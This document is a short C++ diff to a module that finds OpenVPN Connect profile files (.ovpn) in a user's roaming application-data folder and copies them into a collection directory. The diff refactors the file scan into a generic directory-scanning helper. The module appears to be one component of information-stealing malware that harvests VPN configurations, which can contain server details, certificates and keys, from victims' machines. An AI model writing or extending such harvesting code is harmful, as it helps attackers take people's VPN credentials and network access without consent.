@@ -7,7 +7,12 @@
 static const fs::path OPENVPN_PROFILES_PATH = Utils::getRoamingPath() / "OpenVPN Connect" / "profiles";
 
 void OpenVPN::execute(fs::path &root) {
-    std::vector<fs::path> paths = OpenVPN::openvpnProfiles();
+    std::vector<fs::path> paths = FilesUtil::scanDirectory(OPENVPN_PROFILES_PATH, [](const fs::path &path) {
+        std::string extension = path.extension().string();
+        extension.erase(0, 1);
+
+        return extension == "ovpn";
+    });
 
     if(paths.empty())
         return;
@@ -19,25 +24,4 @@ void OpenVPN::execute(fs::path &root) {
     {
         Utils::copy(path, dst);
     }
-}
-
-std::vector<fs::path> OpenVPN::openvpnProfiles() {
-    std::vector<fs::path> paths;
-    try
-    {
-        for (const auto& entry : fs::directory_iterator(OPENVPN_PROFILES_PATH)) {
-            const fs::path& item_path = entry.path();
-
-            std::string extension = item_path.extension().string();
-            extension.erase(0, 1);
-
-            if(extension != "ovpn")
-                continue;
-
-            paths.push_back(item_path);
-        }
-    }
-    catch (const fs::filesystem_error& ignored) {}
-
-    return paths;
 }
